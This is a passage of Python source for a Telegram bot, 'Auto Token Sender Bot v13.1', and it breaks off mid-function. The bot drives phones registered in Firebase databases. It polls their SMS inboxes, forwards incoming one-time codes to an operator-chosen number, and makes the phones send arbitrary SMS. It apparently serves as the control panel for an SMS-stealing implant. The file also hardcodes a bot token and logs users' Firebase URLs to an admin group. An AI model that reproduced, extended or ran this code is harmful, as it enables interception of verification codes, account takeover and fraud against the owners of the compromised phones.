"""
AUTO TOKEN SENDER BOT v13.1.0
Fixes over v12:
  ✅ Absolute DATA_FILE path (no more lost data on restart)
  ✅ pending_setup saved/loaded (device+SIM survive restart)
  ✅ html.escape() on ALL dynamic content — no more "can't parse entities"
  ✅ Safe _send() — fallback to plain text if HTML still fails
  ✅ Raw outgoing SMS — body sent as-is, zero modification
  ✅ v13.1: FWD prefix removed from incoming SMS forward
  ✅ Admin commands: /banuser /promoteuser /statsuser /listusers
                    /sessions /newfirebase /topfirebase /biguser
  ✅ Ban check — banned users blocked at message handler
  ✅ Commands work from master-admin DM AND from ADMIN_LOG_GROUP
"""
import telebot
from telebot import types
import pyrebase, time, re, os, threading, pickle, logging, html as _html
from datetime import datetime, date
from concurrent.futures import ThreadPoolExecutor
import hashlib

# ══════════════════════════════════════════════════════════════
#  CONFIG  — fill these before running
# ══════════════════════════════════════════════════════════════
BOT_TOKEN        = "8294408174:AAGHZqW_1FsTSOythx-AgZyjNIQkTDzjXjY"
MASTER_ADMIN_ID  = 6304055653
# Group where ALL logs go (Firebase creds, new users, sessions)
# Add the bot as ADMIN in this group, then paste its ID here
ADMIN_LOG_GROUP  = "-1004344037267"      # e.g. -1001234567890

# Users MUST join this group before using the bot
REQUIRED_GROUP      = "-1003900500127"   # e.g. @mycommunity  or  -100xxxxxxx
REQUIRED_GROUP_LINK = "https://t.me/+ei9MqYbBVLRkNTQ9"   # e.g. https://t.me/mycommunity

MASTER_FB_URL    = ""      # optional: your own Firebase for logging
SUPPORT_USER     = "@YourSupport"

# ── Absolute path — data.pkl always saved next to this script ─
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.pkl")

SESSION_TIMEOUT  = 360     # 6 min inactivity auto-stop

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)
bot      = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=30)
executor = ThreadPoolExecutor(max_workers=20)
master_db = None

# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════
user_states    = {}
user_firebase  = {}
pending_setup  = {}      # uid -> {fid, cid, sim_idx, db}
user_session   = {}
user_channel   = {}
fwd_number     = {}
user_seen      = {}
user_locked    = {}
user_stats     = {}
daily          = {}
user_all       = set()
active_nums    = {}      # phone -> uid
active_devices = {}      # device_id -> uid
_locks         = {}
_threads       = {}
verified_users = set()   # completed join verification
banned_users   = set()   # banned user IDs
premium_users  = set()   # premium user IDs
content_seen   = {}      # uid -> {hash: timestamp}

BUTTONS = {
    "🔥 Add Firebase","⚙️ Setup Firebase",
    "📢 Add Channel","📬 Set Forward No.",
    "▶️ Start Session","⏹️ Stop Session",
    "📊 Status","📖 Guide","🆘 Support"
}

def ul(uid):
    if uid not in _locks: _locks[uid] = threading.Lock()
    return _locks[uid]

def today():
    return str(date.today())

def track(key, n=1):
    d = daily.setdefault(today(), {"users":0,"firebase":0,"sessions":0,"sms":0})
    d[key] = d.get(key,0)+n

def ts():
    return datetime.now().strftime("%d %b %Y  %H:%M:%S")

def tshort():
    return datetime.now().strftime("%H:%M:%S")

def spd(ms):
    return f"{ms}ms" if ms<1000 else f"{ms/1000:.1f}s"

def _safe(v):
    """Escape HTML special chars for parse_mode=HTML"""
    return _html.escape(str(v)) if v is not None else ""

def _is_dup(uid, frm, body):
    h   = hashlib.md5(f"{frm}:{body}".encode()).hexdigest()[:16]
    now = time.time()
    uc  = content_seen.setdefault(uid, {})
    if h in uc and now - uc[h] < 30:
        return True
    uc[h] = now
    content_seen[uid] = {k:v for k,v in uc.items() if now-v < 60}
    return False

# ══════════════════════════════════════════════════════════════
#  SAVE / LOAD
# ══════════════════════════════════════════════════════════════
def save():
    try:
        with open(DATA_FILE,"wb") as f:
            pickle.dump({
                "fb":     {u:{fid:{k:v for k,v in fb.items() if k!="db"}
                              for fid,fb in fbs.items()}
                           for u,fbs in user_firebase.items()},
                "sess":   {u:{k:v for k,v in s.items() if k!="db"}
                           for u,s in user_session.items()},
                # pending_setup: save everything except the live db object
                "pending":{u:{k:v for k,v in ps.items() if k!="db"}
                           for u,ps in pending_setup.items()},
                "ch":     user_channel,"fwd":fwd_number,
                "seen":   {u:{p:list(k) for p,k in ps.items()}
                           for u,ps in user_seen.items()},
                "locked": {u:{p:list(k) for p,k in ps.items()}
                           for u,ps in user_locked.items()},
                "stats":  user_stats,"daily":daily,
                "users":  list(user_all),
                "verified":list(verified_users),
                "banned": list(banned_users),
                "premium":list(premium_users),
            },f)
    except Exception as e: log.error(f"save:{e}")

def load():
    global master_db
    try:
        if MASTER_FB_URL:
            master_db = _fb_connect(MASTER_FB_URL)
        if not os.path.exists(DATA_FILE): return
        with open(DATA_FILE,"rb") as f: d=pickle.load(f)
        user_channel.update(d.get("ch",{}))
        fwd_number.update(d.get("fwd",{}))
        user_stats.update(d.get("stats",{}))
        daily.update(d.get("daily",{}))
        user_all.update(d.get("users",[]))
        verified_users.update(d.get("verified",[]))
        banned_users.update(d.get("banned",[]))
        premium_users.update(d.get("premium",[]))
        for u,ps in d.get("seen",{}).items():
            user_seen[u]={p:set(k) for p,k in ps.items()}
        for u,ps in d.get("locked",{}).items():
            user_locked[u]={p:set(k) for p,k in ps.items()}
        # Restore Firebase connections
        for u,fbs in d.get("fb",{}).items():
            user_firebase[u]={}
            for fid,fb in fbs.items():
                url=fb.get("url")
                if url:
                    db=_fb_connect(url)
                    if db: user_firebase[u][fid]={**fb,"db":db}
        # Restore pending_setup (device + SIM selection)
        for u,ps in d.get("pending",{}).items():
            fid=ps.get("fid"); cid=ps.get("cid")
            if fid and cid:
                fb=user_firebase.get(u,{}).get(fid)
                if fb:
                    pending_setup[u]={**ps,"db":fb["db"]}
                else:
                    pending_setup[u]=ps   # keep without db; user must re-run setup
        # Restore sessions and re-launch monitors
        for u,s in d.get("sess",{}).items():
            fb=user_firebase.get(u,{}).get(s.get("fb_id"))
            if fb:
                user_session[u]={**s,"db":fb["db"]}
                num=fwd_number.get(u)
                if num: active_nums[num]=u
                cid=s.get("client_id")
                if cid: active_devices[cid]=u
                _launch_monitor(u)
    except Exception as e: log.error(f"load:{e}")

threading.Thread(
    target=lambda:[time.sleep(300) or save() for _ in iter(int,1)],
    daemon=True).start()

# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════
def _send(uid, text, kb=None, parse_mode="HTML"):
    """Send with HTML; falls back to plain text if entities fail."""
    markup = kb if kb is not None else main_kb(uid)
    try:
        return bot.send_message(uid, text, reply_markup=markup, parse_mode=parse_mode)
    except Exception as e:
        err = str(e).lower()
        if "can't parse" in err or "bad request" in err:
            try:
                # Strip HTML tags and retry as plain text
                plain = re.sub(r"<[^>]+>", "", text)
                return bot.send_message(uid, plain, reply_markup=markup, parse_mode=None)
            except Exception as e2:
                log.error(f"send fallback:{e2}")
        else:
            log.error(f"send:{e}")
        return None

def _rm(uid, text):
    try:
        return bot.send_message(uid, text,
            reply_markup=types.ReplyKeyboardRemove(),
            parse_mode="HTML")
    except Exception as e:
        log.error(f"rm:{e}"); return None

def _edit(msg, text, kb=None):
    if msg:
        try: bot.delete_message(msg.chat.id, msg.message_id)
        except: pass
    if not msg: return None
    try:
        return bot.send_message(msg.chat.id, text,
            reply_markup=kb if kb is not None else main_kb(msg.chat.id),
            parse_mode="HTML")
    except Exception as e: log.error(f"edit:{e}"); return None

def _edit_id(cid, mid, text, kb=None):
    try: bot.delete_message(cid, mid)
    except: pass
    try:
        return bot.send_message(cid, text,
            reply_markup=kb if kb is not None else main_kb(cid),
            parse_mode="HTML")
    except Exception as e: log.error(f"edit_id:{e}"); return None

def _ans(call, t="", alert=False):
    try: bot.answer_callback_query(call.id, t, show_alert=alert)
    except: pass

def norm(raw):
    n=re.sub(r"[\s\-]","",str(raw))
    if n.startswith("+"): return n
    if n.startswith("91") and len(n)==12: return "+"+n
    if len(n)==10: return "+91"+n
    return n

def utag(msg):
    u=msg.from_user
    return f"@{u.username}" if u.username else (u.first_name or str(u.id))

def _to_group(text):
    """Send to ADMIN_LOG_GROUP."""
    if not ADMIN_LOG_GROUP:
        log.warning("ADMIN_LOG_GROUP not set — skipping group log")
        return
    try:
        gid = int(ADMIN_LOG_GROUP) if str(ADMIN_LOG_GROUP).lstrip("-").isdigit() else ADMIN_LOG_GROUP
        bot.send_message(gid, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"_to_group failed: {e}")

def _reply(message, text, kb=None):
    """Reply to a command in any chat (DM or group)."""
    cid = message.chat.id
    try:
        markup = kb if kb is not None else (main_kb(cid) if message.chat.type=="private" else None)
        bot.send_message(cid, text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        log.error(f"_reply:{e}")

def _to_admin(text):
    if MASTER_ADMIN_ID and MASTER_ADMIN_ID!=123456789:
        try: bot.send_message(MASTER_ADMIN_ID, text, parse_mode="HTML")
        except: pass

def log_master(path, data):
    if master_db:
        try: master_db.child(path).set(data)
        except: pass

def is_joined(uid):
    if not REQUIRED_GROUP: return True
    if uid == MASTER_ADMIN_ID: return True
    try:
        member = bot.get_chat_member(REQUIRED_GROUP, uid)
        return member.status in ["member","administrator","creator"]
    except Exception as e:
        log.warning(f"is_joined check failed for {uid}: {e}")
        return False

def join_prompt(uid):
    kb = types.InlineKeyboardMarkup()
    if REQUIRED_GROUP_LINK:
        kb.add(types.InlineKeyboardButton("👥 Join Community", url=REQUIRED_GROUP_LINK))
    kb.add(types.InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join"))
    _send(uid, f"""
👋 <b>Welcome!</b>

To use this bot, you must join our community first.

{f'🔗 <a href="{REQUIRED_GROUP_LINK}">Join our group</a>' if REQUIRED_GROUP_LINK else f'🔗 Join: {REQUIRED_GROUP}'}

After joining, tap <b>✅ I've Joined — Verify</b> below.
""", kb=kb)

def check_access(uid):
    if uid in banned_users: return False
    if REQUIRED_GROUP:
        if uid not in verified_users:
            return False
        if not is_joined(uid):
            verified_users.discard(uid)
            save()
            return False
    return True

def is_admin_cmd(message):
    """True if master admin sent the command (works from DM or ADMIN_LOG_GROUP)."""
    return message.from_user.id == MASTER_ADMIN_ID

# ══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════
def main_kb(uid):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(types.KeyboardButton("🔥 Add Firebase"),
           types.KeyboardButton("⚙️ Setup Firebase"))
    kb.add(types.KeyboardButton("📢 Add Channel"),
           types.KeyboardButton("📬 Set Forward No."))
    kb.add(types.KeyboardButton(
        "⏹️ Stop Session" if uid in user_session else "▶️ Start Session"))
    kb.add(types.KeyboardButton("📊 Status"),
           types.KeyboardButton("📖 Guide"))
    kb.add(types.KeyboardButton("🆘 Support"))
    return kb

def sim_kb():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("📶 SIM 1", callback_data="sim_0"),
        types.InlineKeyboardButton("📶 SIM 2", callback_data="sim_1"))
    kb.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
    return kb

def fb_kb(uid, action="setup"):
    kb = types.InlineKeyboardMarkup(row_width=1)
    for fid,fb in user_firebase.get(uid,{}).items():
        url = fb.get("url","").replace("https://","").replace(".firebaseio.com","")[:28]
        kb.add(types.InlineKeyboardButton(f"🔥 {url}",
               callback_data=f"{action}|{fid}"))
    kb.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
    return kb

# ══════════════════════════════════════════════════════════════
#  FIREBASE
# ══════════════════════════════════════════════════════════════
def _fb_connect(url):
    try:
        db = pyrebase.initialize_app({
            "apiKey":"x","authDomain":"x.app",
            "databaseURL":url,"storageBucket":"x.app"
        }).database()
        db.child("ping").get()
        return db
    except Exception as e: log.error(f"fb_connect:{e}"); return None

def _counts(db):
    try:
        all_c = db.child("clients").get()
        if not all_c or not all_c.each(): return 0,0,0
        on=off=0
        for c in all_c.each():
            v=c.val()
            if v and v.get("status") is True: on+=1
            else: off+=1
        return on,off,on+off
    except: return 0,0,0

def _list_clients(db):
    try:
        all_c = db.child("clients").get()
        if all_c and all_c.each():
            return [(c.key(),(c.val() or {}).get("status") is True)
                    for c in all_c.each() if c.key()]
    except: pass
    return []

def _get_device(db, cid):
    cid = cid.strip()
    try:
        d = db.child(f"clients/{cid}").get()
        if d and isinstance(d.val(),dict) and d.val():
            return cid, d.val()
    except Exception as e: log.error(f"get_dev:{e}")
    try:
        all_c = db.child("clients").get()
        if all_c and all_c.each():
            devs = list(all_c.each())
            for c in devs:
                if (c.key() or "")==cid: return c.key(),c.val()
            for c in devs:
                k=c.key() or ""
                if k.lower()==cid.lower(): return k,c.val()
            for c in devs:
                k=c.key() or ""
                if len(cid)>=8 and k.lower().startswith(cid[:8].lower()):
                    return k,c.val()
    except Exception as e: log.error(f"get_dev_search:{e}")
    return None,None

# ══════════════════════════════════════════════════════════════
#  SMS
# ══════════════════════════════════════════════════════════════
_FROM=["from","smsFrom","sender","address","number","phoneNumber","mobile"]
_BODY=["body","smsBody","message","text","content","msg","smsMessage","Body","Message"]

def _read(v):
    def f(keys):
        for k in keys:
            x=v.get(k)
            if x and str(x).strip() not in ("","null","None"):
                return str(x).strip()
        return ""
    return f(_FROM),f(_BODY)

def _find_paths(db,cid):
    found=[]
    for node in ["messages","sms","inbox","otp"]:
        for p in [f"{node}/{cid}",f"clients/{cid}/{node}"]:
            try:
                if db.child(p).get().val(): found.append(p)
            except: pass
    return found or [f"messages/{cid}"]

def _is_seen(uid,p,k):
    return (k in user_seen.get(uid,{}).get(p,set()) or
            k in user_locked.get(uid,{}).get(p,set()))

def _mark(uid,p,k):
    user_seen.setdefault(uid,{}).setdefault(p,set()).add(k)
    user_locked.setdefault(uid,{}).setdefault(p,set()).add(k)

def _snapshot(uid,cid,db):
    ps = _find_paths(db,cid)
    user_locked.setdefault(uid,{})
    user_seen.setdefault(uid,{})
    for p in ps:
        try:
            v=db.child(p).get().val()
            if isinstance(v,dict):
                user_locked[uid].setdefault(p,set()).update(v.keys())
                user_seen[uid].setdefault(p,set()).update(v.keys())
        except: pass
    return ps

# ══════════════════════════════════════════════════════════════
#  MONITOR (0.5s)
# ══════════════════════════════════════════════════════════════
def _fwd(uid,frm,body,sim_idx,db,cid):
    tgt=fwd_number.get(uid)
    if not tgt: return False
    try:
        db.child(f"clients/{cid}/webhookEvent/sendSms").set({
            "from":sim_idx,"isSended":False,
            "message":body,"to":norm(tgt)
        })
        return True
    except Exception as e: log.error(f"fwd:{e}"); return False

def _check(uid):
    lock=ul(uid)
    if not lock.acquire(blocking=False): return
    try:
        sess=user_session.get(uid)
        if not sess: return
        db=sess.get("db"); cid=sess.get("client_id")
        chat_id=sess.get("chat_id",uid); sim_idx=sess.get("sim_index",0)
        if not db or not cid: return
        last_act=sess.get("last_sms_time",sess.get("start_time",time.time()))
        if time.time()-last_act>SESSION_TIMEOUT:
            _stop_session(uid)
            _send(uid,
                f"⏱️ <b>Session Auto-Stopped</b>\n\n"
                f"No activity for 6 minutes.\n"
                f"📊 Forwarded: {user_stats.get(uid,{}).get('total',0)} SMS\n\n"
                f"Tap ▶️ Start Session to begin a new session.\n"
                f"Help: {SUPPORT_USER}")
            return
        s=user_stats.setdefault(uid,{"ok":0,"fail":0,"total":0})
        for path in sess.get("paths",[]):
            try:
                val=db.child(path).get().val()
                if not isinstance(val,dict): continue
                for k,v in val.items():
                    if not isinstance(v,dict): continue
                    if _is_seen(uid,path,k): continue
                    _mark(uid,path,k)
                    frm,body=_read(v)
                    if not frm and not body: continue
                    recv_time=tshort()
                    if _is_dup(uid, frm or "Unknown", body or "(empty)"):
                        log.info(f"Duplicate SMS skipped: {frm}")
                        continue
                    sess["last_sms_time"] = time.time()
                    t0=time.time()
                    ok=_fwd(uid,frm or "Unknown",body or "(empty)",sim_idx,db,cid)
                    ms=int((time.time()-t0)*1000)
                    s["ok" if ok else "fail"]+=1; s["total"]+=1
                    track("sms")
                    tgt=fwd_number.get(uid,"-")
                    # ─── Use _safe() on ALL user-supplied content ─────────────
                    sf  = _safe(frm or "Unknown")
                    sb  = _safe(body or "(empty)")
                    stgt= _safe(tgt)
                    if ok:
                        _send(chat_id,f"""
✅ <b>OTP FORWARDED</b>
━━━━━━━━━━━━━━━━━━━━━━
📧 <b>From</b>    : {sf}
📲 <b>To</b>      : <code>{stgt}</code>
💬 <b>Message</b> : {sb}
📡 <b>Via</b>     : SIM {sim_idx+1}
🕐 <b>Time</b>    : {recv_time}
⚡ <b>Speed</b>   : {spd(ms)}
📊 <b>Total</b>   : {s['total']}""")
                    else:
                        _send(chat_id,f"""
❌ <b>FORWARD FAILED</b>
━━━━━━━━━━━━━━━━━━━━━━
📧 From    : {sf}
💬 Message : {sb}
🕐 Time    : {recv_time}""")
            except Exception as e: log.error(f"path:{e}")
        save()
    finally: lock.release()

def _launch_monitor(uid):
    sess=user_session.get(uid)
    if not sess: return
    cid=sess.get("client_id")
    def run():
        while uid in user_session and user_session[uid].get("client_id")==cid:
            _check(uid)
            time.sleep(0.5)
    t=threading.Thread(target=run,daemon=True,name=f"mon-{uid}")
    t.start(); _threads[uid]=t

def _stop_session(uid):
    sess=user_session.pop(uid,None)
    if sess:
        num=fwd_number.get(uid)
        if num and active_nums.get(num)==uid: active_nums.pop(num,None)
        cid=sess.get("client_id")
        if cid and active_devices.get(cid)==uid: active_devices.pop(cid,None)
    save()
    return sess

def _start_session(uid,cid,fid,db,chat_id,sim_idx,tag):
    num=fwd_number.get(uid)
    if num and num in active_nums and active_nums[num]!=uid:
        _send(uid,f"⚠️ <b>Number Busy</b>\n\n<code>{_safe(num)}</code> is already in an active session.\nThat admin must stop first.")
        return False
    if cid in active_devices and active_devices[cid]!=uid:
        other_uid = active_devices[cid]
        _send(uid,f"⚠️ <b>Device Already In Use</b>\n\n<code>{_safe(cid)}</code> is active in another session (admin <code>{other_uid}</code>).\nThat session must stop first.")
        return False
    if uid in user_session:
        old_cid = user_session[uid].get("client_id","")
        _stop_session(uid)
        log.info(f"Stopped previous session {old_cid} for uid {uid}")
    ps=_snapshot(uid,cid,db)
    user_session[uid]={
        "client_id":cid,"fb_id":fid,"db":db,
        "chat_id":chat_id,"paths":ps,
        "sim_index":sim_idx,"start_time":time.time()
    }
    if num: active_nums[num]=uid
    active_devices[cid]=uid
    _launch_monitor(uid); save()
    track("sessions")
    fb_url=user_firebase.get(uid,{}).get(fid,{}).get("url","—")
    _to_group(f"""
▶️ <b>SESSION STARTED</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 Admin    : {_safe(tag)} (<code>{uid}</code>)
📱 Device   : <code>{_safe(cid)}</code>
📡 SIM      : SIM {sim_idx+1}
📲 Forward  : <code>{_safe(num or '—')}</code>
🔥 Firebase : <code>{_safe(fb_url)}</code>
🕐 Time     : {ts()}""")
    log_master(f"sessions/{uid}/{int(time.time())}",
               {"cid":cid,"sim":sim_idx+1,"fwd":num,"tag":tag,"fb":fb_url,"ts":ts()})
    return True

# ══════════════════════════════════════════════════════════════
#  OUTGOING (group/channel → device)  — RAW PASS-THROUGH
# ══════════════════════════════════════════════════════════════
def _clean_num(raw):
    """Strip backticks/quotes then normalise number."""
    return re.sub(r"[\s\-`\'\"]+", "", raw).strip()

def _parse_out(text):
    """
    Extract TO number and BODY from outgoing message.
    Body is returned RAW — zero modification, zero escaping.
    """
    to = msg = None
    text = text.strip()

    # ── Phone number ────────────────────────────────────────────
    num_pat = r"[`\'\"\s]*([+\d][\d\s]{4,18})[`\'\"\s]*"
    for pat in [
        r"To\s*\(Tap\s*to\s*copy\)\s*:\s*[\n\r\s]*" + num_pat,
        r"\U0001f4de\s*To\s*:\s*" + num_pat,
        r"\bTo\s*:\s*" + num_pat,
        r"\|\s*" + num_pat + r"\s*\|",
    ]:
        m = re.search(pat, text, re.IGNORECASE | re.MULTILINE)
        if m:
            raw = _clean_num(m.group(1))
            if len(re.sub(r"[^\d]","",raw)) >= 7:
                to = raw; break

    # ── Body — take as-is, strip only surrounding backticks ─────
    body_pat = r"[`\'\"\s]*([\s\S]+?)[`\'\"\s]*"
    for pat in [
        r"Body\s*\(Tap\s*to\s*copy\)\s*:\s*[\n\r]+" + body_pat + r"(?:\n\n|\Z)",
        r"Body\s*\(Tap\s*to\s*copy\)\s*:\s*([^\n`]+)",
        r"\U0001f4ac\s*Message\s*:\s*" + body_pat + r"(?:\n\n|\Z)",
        r"\bMessage\s*:\s*" + body_pat + r"(?:\n\n|\Z)",
        r"\bBody\s*:\s*[\n\r\s]*" + body_pat + r"(?:\n\n|\Z)",
        r"[+\d][\d\s\-]{7,18}\s*\|\s*([^\n]+)",
    ]:
        m = re.search(pat, text, re.DOTALL | re.IGNORECASE)
        if m:
            # Strip ONLY surrounding backticks/quotes, keep inner content raw
            candidate = m.group(1)
            # Remove surrounding backtick lines if present
            lines = candidate.splitlines()
            clean_lines = []
            for line in lines:
                stripped = line.strip().strip("`\'\"")
                if stripped:
                    clean_lines.append(stripped)
            if clean_lines:
                msg = " ".join(clean_lines); break

    return to, msg


def _extract_any(text):
    """Last-resort: find any phone + any body."""
    phone_pats = [
        r"(\+\d{10,15})",
        r"(91\d{10})",
        r"([6-9]\d{9})",
        r"(0\d{10})",
        r"(\d{10})",
    ]
    phone = None
    for pat in phone_pats:
        m = re.search(pat, text)
        if m: phone = m.group(1); break

    body = None
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    for line in lines:
        if re.match(r"^[+\d\s\-]+$", line): continue
        if len(line) < 5: continue
        if any(skip in line.lower() for skip in ["intercepted","outgoing","tap to copy","one-tap"]):
            continue
        if len(line) > len(body or ""):
            body = line
    return phone, body


def _outgoing(message):
    chat_id = message.chat.id
    raw     = message.text or message.caption or ""
    if not raw: return

    uid = None
    for u, ch in user_channel.items():
        stored = ch.get("id")
        if stored == chat_id or str(stored) == str(chat_id):
            uid = u; break

    if not uid:
        log.debug(f"[OUT] no channel match for {chat_id}"); return

    sess = user_session.get(uid)
    if not sess:
        log.warning(f"[OUT] no session for uid={uid}"); return

    db  = sess.get("db")
    cid = sess.get("client_id")
    sim = sess.get("sim_index", 0)
    if not db or not cid: return

    to, msg = _parse_out(raw)
    log.info(f"[OUT] primary → to={to!r} msg={str(msg)[:60]!r}")

    if not to or not msg:
        to, msg = _extract_any(raw)
        log.info(f"[OUT] fallback → to={to!r} msg={str(msg)[:60]!r}")

    if not to or not msg:
        log.warning(f"[OUT] PARSE FAILED. Raw:\n{repr(raw)}")
        _to_admin(f"⚠️ <b>Message not parsed</b>\nRaw:\n<code>{_safe(raw[:300])}</code>")
        return

    # ── Send via Firebase — body is RAW, untouched ───────────────
    t0 = time.time()
    try:
        db.child(f"clients/{cid}/webhookEvent/sendSms").set({
            "from": sim, "isSended": False,
            "message": msg,   # raw body — no escaping, no modification
            "to": to
        })
        ms = int((time.time()-t0)*1000)
        s  = user_stats.setdefault(uid, {"ok":0,"fail":0,"total":0})
        s["ok"] += 1; s["total"] += 1
        log.info(f"[OUT] ✅ to={to} msg={str(msg)[:40]} in {ms}ms")
        # Confirmation to admin — escape for HTML display only
        _send(uid, f"✅ <b>SMS SENT</b>\n📲 <code>{_safe(to)}</code>\n💬 {_safe(msg)}\n⚡ {spd(ms)}")
    except Exception as e:
        log.error(f"[OUT] Firebase error: {e}")
        _send(uid, f"❌ Send failed: {_safe(str(e)[:80])}")

# ══════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
#  Work from: MASTER_ADMIN_ID DM  OR  ADMIN_LOG_GROUP
# ══════════════════════════════════════════════════════════════
def _admin_help():
    return """
🔑 <b>ADMIN COMMANDS</b>
━━━━━━━━━━━━━━━━━━━━━━
/stats           — today + all-time stats
/sessions        — active sessions now
/listusers       — all users list
/biguser         — most active user (most SMS)
/topfirebase     — Firebase with most users
/newfirebase     — Firebaselogged today
/statsuser &lt;id&gt; — stats for a specific user
/banuser &lt;id&gt;   — ban a user
/promoteuser &lt;id&gt; — promote to premium
/unbanuser &lt;id&gt; — remove ban
━━━━━━━━━━━━━━━━━━━━━━"""

@bot.message_handler(
    commands=["stats","sessions","listusers","biguser","topfirebase",
              "newfirebase","statsuser","banuser","unbanuser","promoteuser","adminhelp"],
    func=lambda m: m.from_user.id == MASTER_ADMIN_ID)
def admin_commands(message):
    uid  = message.from_user.id
    text = message.text or ""
    cmd  = text.split()[0].lower().lstrip("/").split("@")[0]
    args = text.split()[1:] if len(text.split()) > 1 else []

    if cmd == "stats":
        t=today(); td=daily.get(t,{})
        all_sms  = sum(v.get("sms",0) for v in daily.values())
        all_sess = sum(v.get("sessions",0) for v in daily.values())
        total_fb = sum(len(fbs) for fbs in user_firebase.values())
        _reply(message, f"""
📊 <b>MASTER STATS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>TODAY ({t})</b>
👥 New users    : {td.get('users',0)}
🔥 Firebase     : {td.get('firebase',0)}
▶️ Sessions     : {td.get('sessions',0)}
📨 SMS          : {td.get('sms',0)}

<b>ALL TIME</b>
👥 Users        : {len(user_all)}
🔥 Firebase     : {total_fb}
▶️ Sessions     : {all_sess}
📨 SMS          : {all_sms}
🚫 Banned       : {len(banned_users)}
⭐ Premium      : {len(premium_users)}

<b>NOW</b>
🟢 Active sess  : {len(user_session)}
🔒 Devices live : {len(active_devices)}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 {ts()}""", kb=None)

    elif cmd == "sessions":
        if not user_session:
            _reply(message, "🟢 No active sessions right now.", kb=None); return
        lines = []
        for u, sess in user_session.items():
            cid  = sess.get("client_id","?")
            sim  = sess.get("sim_index",0)+1
            num  = fwd_number.get(u,"—")
            secs = int(time.time()-sess.get("start_time",time.time()))
            lines.append(f"• <code>{u}</code> | Dev: <code>{_safe(cid[:12])}</code> | SIM{sim} | {secs//60}m")
        _reply(message, f"▶️ <b>Active Sessions ({len(user_session)})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines), kb=None)

    elif cmd == "listusers":
        if not user_all:
            _reply(message, "No users yet.", kb=None); return
        lines = []
        for u in list(user_all)[:50]:
            tags = []
            if u == MASTER_ADMIN_ID: tags.append("👑")
            if u in banned_users: tags.append("🚫")
            if u in premium_users: tags.append("⭐")
            if u in user_session: tags.append("🟢")
            s = user_stats.get(u,{})
            label = " ".join(tags) or "👤"
            lines.append(f"{label} <code>{u}</code> — {s.get('total',0)} SMS")
        _reply(message, f"👥 <b>Users ({len(user_all)})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines[:40]), kb=None)

    elif cmd == "biguser":
        if not user_stats:
            _reply(message, "No stats yet.", kb=None); return
        top = max(user_stats, key=lambda u: user_stats[u].get("total",0))
        s = user_stats[top]
        fbs = len(user_firebase.get(top,{}))
        _reply(message, f"""
🏆 <b>TOP USER</b>
━━━━━━━━━━━━━━━━━━━━━━
🆔 ID       : <code>{top}</code>
📨 SMS      : {s.get('total',0)}
✅ OK       : {s.get('ok',0)}
❌ Failed   : {s.get('fail',0)}
🔥 Firebase : {fbs}
🟢 Active   : {'Yes' if top in user_session else 'No'}""", kb=None)

    elif cmd == "topfirebase":
        counts = {}
        for u, fbs in user_firebase.items():
            s = user_stats.get(u, {})
            for fid in fbs:
                counts[fid] = counts.get(fid,0) + s.get("total",0)
        if not counts:
            _reply(message, "No Firebase data yet.", kb=None); return
        top_fid = max(counts, key=counts.get)
        # Find owner
        owner = None
        url   = "—"
        for u, fbs in user_firebase.items():
            if top_fid in fbs:
                owner = u
                url   = fbs[top_fid].get("url","—")
                break
        _reply(message, f"""
🔥 <b>TOP FIREBASE</b>
━━━━━━━━━━━━━━━━━━━━━━
🆔 ID    : <code>{_safe(top_fid)}</code>
🌐 URL   : <code>{_safe(url[-40:])}</code>
👤 Owner : <code>{owner or '?'}</code>
📨 SMS   : {counts[top_fid]}""", kb=None)

    elif cmd == "newfirebase":
        t = today()
        td = daily.get(t, {})
        _reply(message, f"🔥 <b>New Firebase Today ({t})</b>\n\nAdded: {td.get('firebase',0)}", kb=None)

    elif cmd == "statsuser":
        if not args:
            _reply(message, "Usage: /statsuser &lt;user_id&gt;", kb=None); return
        try: tid = int(args[0])
        except: _reply(message, "❌ Invalid user ID.", kb=None); return
        s   = user_stats.get(tid, {})
        fbs = len(user_firebase.get(tid,{}))
        ch  = user_channel.get(tid,{}).get("title","—")
        num = fwd_number.get(tid,"—")
        tags = []
        if tid in banned_users: tags.append("🚫 BANNED")
        if tid in premium_users: tags.append("⭐ PREMIUM")
        if tid in user_session: tags.append("🟢 ACTIVE")
        _reply(message, f"""
📊 <b>USER STATS</b>
━━━━━━━━━━━━━━━━━━━━━━
🆔 ID       : <code>{tid}</code>
📨 SMS      : {s.get('total',0)}
✅ OK       : {s.get('ok',0)}
❌ Failed   : {s.get('fail',0)}
🔥 Firebase : {fbs}
📢 Channel  : {_safe(ch)}
📲 Forward  : <code>{_safe(num)}</code>
🏷️ Status  : {', '.join(tags) if tags else '—'}""", kb=None)

    elif cmd == "banuser":
        if not args:
            _reply(message, "Usage: /banuser &lt;user_id&gt;", kb=None); return
        try: tid = int(args[0])
        except: _reply(message, "❌ Invalid user ID.", kb=None); return
        if tid == MASTER_ADMIN_ID:
            _reply(message, "❌ Cannot ban master admin.", kb=None); return
        banned_users.add(tid)
        # Force-stop their session if active
        if tid in user_session:
            _stop_session(tid)
            try: bot.send_message(tid, "🚫 Your access has been suspended. Contact support.")
            except: pass
        save()
        _reply(message, f"🚫 User <code>{tid}</code> banned.", kb=None)
        log.info(f"Admin banned uid={tid}")

    elif cmd == "unbanuser":
        if not args:
            _reply(message, "Usage: /unbanuser &lt;user_id&gt;", kb=None); return
